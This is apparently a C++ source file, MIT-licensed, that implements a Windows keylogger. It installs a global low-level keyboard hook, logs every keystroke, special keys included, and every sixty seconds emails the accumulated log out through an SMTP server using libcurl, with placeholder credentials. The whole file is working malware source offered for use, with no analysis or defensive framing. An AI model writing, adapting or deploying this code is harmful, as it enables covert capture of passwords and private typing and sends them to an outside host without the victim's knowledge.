/*
MIT License

Copyright (c) 2025 solveditnpc

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <windows.h>
#include <stdio.h>
#include <string>
#include <curl/curl.h>
#include <fstream>
#include <sstream>
#include <ctime>

#define EMAIL_ADDRESS "YOUR_USERNAME"
#define EMAIL_PASSWORD "YOUR_PASSWORD"
#define SEND_REPORT_EVERY 60 // seconds

std::string keylog_data = "KeyLogger Started...";

// Function to send email using SMTP
bool send_email(const std::string& message) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    
    curl = curl_easy_init();
    if(curl) {
        // Set up the SMTP server details
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.mailtrap.io:2525");
        curl_easy_setopt(curl, CURLOPT_USERNAME, EMAIL_ADDRESS);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, EMAIL_PASSWORD);
        
        // these don't have to be set ,these are just for the smtp server ,it doesn't affect the email sending
        std::string from = "Private Person <from@example.com>";
        std::string to = "A Test User <to@example.com>";
        
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from.c_str());
        recipients = curl_slist_append(recipients, to.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        // Prepare email content
        std::string email_content = "To: " + to + "\r\n"
                                  "From: " + from + "\r\n"
                                  "Subject: Keylogger Report\r\n"
                                  "\r\n" + message;
        
        curl_easy_setopt(curl, CURLOPT_READDATA, email_content.c_str());
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        
        // Send the email
        res = curl_easy_perform(curl);
        
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
        
        return (res == CURLE_OK);
    }
    return false;
}

// Timer function to send reports periodically
VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    if (!keylog_data.empty()) {
        if (send_email(keylog_data)) {
            keylog_data = ""; // Clear the log after successful send
        }
    }
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    if(wParam == WM_KEYDOWN)
    {
        std::string key_pressed;
        switch(pkey->vkCode)
        {
            case VK_ENTER:
                key_pressed = "(ENTER)";
                break;
            case VK_BACK:
                key_pressed = "(BACKSPACE)";
                break;
            case VK_SPACE:
                key_pressed = "(SPACEBAR)";
                break;
            case VK_LSHIFT:
                key_pressed = "(SHIFT)";
                break;
            case VK_TAB:
                key_pressed = "(TAB)";
                break;    
            case VK_ESCAPE:
                key_pressed = "(ESC)";
                break;
            case VK_CONTROL:
                key_pressed = "(CTRL)";
                break;
            case VK_MENU:
                key_pressed = "(ALT)";
                break;
            case VK_CAPITAL:
                key_pressed = "(CAPS_LOCK)";
                break;
            case VK_DELETE:
                key_pressed = "(DEL)";
                break;
            case VK_LEFT:
                key_pressed = "(LEFT_ARROW)";
                break;
            case VK_RIGHT:
                key_pressed = "(RIGHT_ARROW)";
                break;
            case VK_UP:
                key_pressed = "(UP_ARROW)";
                break;
            case VK_DOWN:
                key_pressed = "(DOWN_ARROW)";
                break;
            case VK_HOME:
                key_pressed = "(HOME)";
                break;
            case VK_END:
                key_pressed = "(END)";
                break;
            case VK_PRIOR:
                key_pressed = "(PAGE_UP)";
                break;
            case VK_NEXT:
                key_pressed = "(PAGE_DOWN)";
                break;
            case VK_INSERT:
                key_pressed = "(INSERT)";
                break;
            case VK_F1:
                key_pressed = "(F1)";
                break;
            case VK_F2:
                key_pressed = "(F2)";
                break;
            case VK_F3:
                key_pressed = "(F3)";
                break;
            case VK_F4:
                key_pressed = "(F4)";
                break;
            case VK_F5:
                key_pressed = "(F5)";
                break;
            case VK_F6:
                key_pressed = "(F6)";
                break;
            case VK_F7:
                key_pressed = "(F7)";
                break;
            case VK_F8:
                key_pressed = "(F8)";
                break;
            case VK_F9:
                key_pressed = "(F9)";
                break;
            case VK_F10:
                key_pressed = "(F10)";
                break;
            case VK_F11:
                key_pressed = "(F11)";
                break;
            case VK_F12:
                key_pressed = "(F12)";
                break;
            case VK_NUMLOCK:
                key_pressed = "(NUM_LOCK)";
                break;
            case VK_SCROLL:
                key_pressed = "(SCROLL_LOCK)";
                break;
            case VK_RSHIFT:
                key_pressed = "(RIGHT_SHIFT)";
                break;
            case VK_LCONTROL:
                key_pressed = "(LEFT_CTRL)";
                break;
            case VK_RCONTROL:
                key_pressed = "(RIGHT_CTRL)";
                break;
            case VK_LMENU:
                key_pressed = "(LEFT_ALT)";
                break;
            case VK_RMENU:
                key_pressed = "(RIGHT_ALT)";
                break;
            case VK_PAUSE:
                key_pressed = "(PAUSE)";
                break;
            case VK_PRINT:
                key_pressed = "(PRINT_SCREEN)";
                break;
            default:
                // For regular characters
                char key = MapVirtualKey(pkey->vkCode, MAPVK_VK_TO_CHAR);
                if (key != 0) {
                    key_pressed = key;
                }
        }
        //while testing uncomment the next line below
        //printf("%s", key_pressed.c_str());
        keylog_data += key_pressed; // Add to the log
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    // Initialize curl library
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Set up timer for periodic email sending
    SetTimer(NULL, 0, SEND_REPORT_EVERY * 1000, TimerProc);
    
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if(hook == NULL)
    {
        // while testing uncomment the next line below 
        //printf("Failed to install hook!");
        return 1;
    }
    
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(hook);
    curl_global_cleanup();
    return 0;
}